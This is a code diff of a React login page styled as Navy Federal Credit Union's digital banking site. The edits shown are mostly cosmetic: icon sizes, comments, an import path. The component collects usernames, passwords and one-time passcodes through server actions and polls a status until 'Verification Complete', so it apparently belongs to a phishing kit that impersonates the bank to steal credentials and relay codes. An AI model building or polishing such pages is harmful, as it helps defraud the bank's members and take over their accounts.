@@ -1,14 +1,12 @@
 'use client'
 
 import { useEffect, useState } from 'react'
-
-// Adjust this relative path if your actions.ts is located elsewhere (e.g., '../actions')
 import {
   startChallenge,
   submitUsername,
   submitOtp,
   getStatus,
-} from './actions'
+} from '@/app/actions'
 
 type Step =
   | 'credentials'
@@ -127,10 +125,10 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Header */}
+      {/* Navigation Header */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
-          <button style={styles.iconBtn} aria-label="Menu" type="button">
+          <button style={styles.iconBtn} aria-label="Menu">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
               <line x1="3" y1="12" x2="21" y2="12" />
               <line x1="3" y1="6" x2="21" y2="6" />
@@ -138,7 +136,7 @@ export default function NavyFederalBanking() {
             </svg>
           </button>
           <div style={styles.logoGroup}>
-            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
               <circle cx="12" cy="12" r="10" />
               <line x1="2" y1="12" x2="22" y2="12" />
               <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
@@ -149,14 +147,14 @@ export default function NavyFederalBanking() {
       </header>
 
       <main style={styles.main}>
-        {/* Banner */}
+        {/* Banner Section */}
         <section style={styles.banner}>
           <h1 style={styles.bannerTitle}>
             {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
           </h1>
         </section>
 
-        {/* Card Form */}
+        {/* Card Section */}
         <section style={styles.cardWrapper}>
           <div style={styles.card}>
             {step === 'approved_success' ? (
@@ -169,7 +167,7 @@ export default function NavyFederalBanking() {
             ) : (
               <>
                 <div style={styles.cardHeader}>
-                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
                     <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                     <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                   </svg>
@@ -211,7 +209,7 @@ export default function NavyFederalBanking() {
                             type="button"
                             onClick={() => setShowPassword(!showPassword)}
                             style={styles.eyeBtn}
-                            aria-label="Toggle password visibility"
+                            aria-label="Toggle password"
                           >
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2">
                               {showPassword ? (
@@ -302,22 +300,22 @@ export default function NavyFederalBanking() {
           </div>
         </section>
 
-        {/* Member Callout */}
+        {/* Member Callout Section */}
         <section style={styles.whiteSection}>
           <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
           <p style={styles.sectionDesc}>
             Join now and enjoy the support and great service of a credit union that puts your needs first.
           </p>
           <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-            <button style={styles.btnPrimary} type="button">Become a Member</button>
-            <button style={styles.btnBlue} type="button">Learn More</button>
+            <button style={styles.btnPrimary}>Become a Member</button>
+            <button style={styles.btnBlue}>Learn More</button>
           </div>
         </section>
 
-        {/* Footer */}
+        {/* Footer Section */}
         <footer style={styles.footer}>
           <div style={styles.logoGroupFooter}>
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
               <circle cx="12" cy="12" r="10" />
               <line x1="2" y1="12" x2="22" y2="12" />
             </svg>
@@ -326,9 +324,7 @@ export default function NavyFederalBanking() {
               <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
             </div>
           </div>
-          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>
-            © 2026 Navy Federal Credit Union. All rights reserved.
-          </p>
+          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>© 2026 Navy Federal Credit Union. All rights reserved.</p>
         </footer>
       </main>
     </div>
@@ -369,7 +365,7 @@ const styles: { [key: string]: React.CSSProperties } = {
   },
   logoText: {
     fontWeight: 800,
-    fontSize: 18,
+    fontSize: 20,
     fontStyle: 'italic',
     letterSpacing: '-0.5px',
   },
